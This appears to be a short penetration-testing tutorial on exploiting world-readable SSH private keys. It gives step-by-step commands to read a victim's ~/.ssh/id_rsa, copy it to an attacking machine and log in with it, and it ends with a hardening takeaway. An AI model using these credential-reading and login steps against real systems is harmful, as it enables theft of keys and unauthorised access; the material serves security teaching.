Exploiting Readable Private Keys

If an SSH private key (e.g., ~/.ssh/id_rsa) has weak permissions (e.g., chmod 644), a low-privileged user can read and copy it for unauthorized access.

1Identify Weak Permissions

Look for id_rsa files with permissions like -rw-r--r-- (644), indicating readability by others.

2Copy the Private Key

On the target, use cat ~/.ssh/id_rsa to display and copy the key's content to your attacking machine.

3Set Correct Permissions (Kali)

On your Kali machine, save the copied key (e.g., as id_rsa_victim) and set chmod 600 id_rsa_victim.

4Attempt SSH Login

Use ssh -i id_rsa_victim victim_user@target_ip to log in as the victim user.

Key Takeaway

Always ensure private SSH keys have strict chmod 600 permissions to prevent unauthorized access.

Code Walkthrough: Exploiting Weak Key
# On target, check permissions and cat if readable
ls -l ~/.ssh/id_rsa
# Example output: -rw-r--r-- 1 victim_user victim_user 1679 Sep 15 10:00 id_rsa
cat ~/.ssh/id_rsa

# Copy content to your Kali machine, save as 'id_rsa_victim'

# On Kali machine:
chmod 600 id_rsa_victim
ssh -i id_rsa_victim victim_user@target_ip
Common Mistake

Forgetting to set chmod 600 on the copied private key on your attacking machine. SSH clients will refuse to use keys with insecure permissions.
